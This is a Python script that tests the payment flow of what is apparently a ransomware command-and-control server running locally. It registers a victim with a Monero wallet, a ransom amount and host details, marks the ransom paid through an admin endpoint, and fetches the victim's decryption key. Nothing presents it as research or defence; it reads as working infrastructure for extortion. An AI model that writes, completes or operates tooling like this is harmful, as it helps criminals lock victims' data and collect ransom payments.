#!/usr/bin/env python3
"""Test complete payment flow"""

import urllib.request
import json
import time

ransom_id = 'demo-payment-test'
monero_wallet = '4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV'

print("=" * 70)
print("PAYMENT FLOW TEST")
print("=" * 70)

# Step 1: Register
print('\n[*] Step 1: Registering victim...')
register_url = 'http://127.0.0.1:5000/api/v1/register'
data = json.dumps({
    'ransom_id': ransom_id,
    'monero_address': monero_wallet,
    'ransom_amount_xmr': 0.1,
    'system_info': {
        'hostname': 'TEST-HOST',
        'username': 'TestUser',
        'os_info': 'Windows Test'
    }
}).encode('utf-8')

req = urllib.request.Request(register_url, data=data, method='POST', headers={'Content-Type': 'application/json'})
with urllib.request.urlopen(req) as r:
    reg_result = json.load(r)
    print('[+] Registered:', reg_result)

# Step 2: Check status before payment
print('\n[*] Step 2: Checking status BEFORE payment...')
status_url = f'http://127.0.0.1:5000/api/v1/payment/status/{ransom_id}'
with urllib.request.urlopen(status_url) as r:
    status_before = json.load(r)
    print('[+] Status BEFORE:', json.dumps(status_before, indent=2))

# Step 3: Simulate payment
print('\n[*] Step 3: Simulating payment...')
pay_url = f'http://127.0.0.1:5000/api/v1/admin/pay/{ransom_id}'
pay_req = urllib.request.Request(pay_url, data=b'', method='POST')
with urllib.request.urlopen(pay_req) as r:
    pay_result = json.load(r)
    print('[+] Payment result:', pay_result)

# Wait a moment
time.sleep(1)

# Step 4: Check status after payment
print('\n[*] Step 4: Checking status AFTER payment...')
with urllib.request.urlopen(status_url) as r:
    status_after = json.load(r)
    print('[+] Status AFTER payment:', json.dumps(status_after, indent=2))

# Step 5: Get decryption key
print('\n[*] Step 5: Getting decryption key...')
key_url = f'http://127.0.0.1:5000/api/v1/decryption/key/{ransom_id}'
with urllib.request.urlopen(key_url) as r:
    key_result = json.load(r)
    print('[+] Decryption key retrieved!')
    key_len = len(key_result.get('key', ''))
    print(f'    Key length: {key_len} chars')
    print(f'    Key (first 50 chars): {key_result.get("key", "")[:50]}...')

print("\n" + "=" * 70)
print("TEST COMPLETE - GUI should have updated with payment info!")
print("=" * 70)
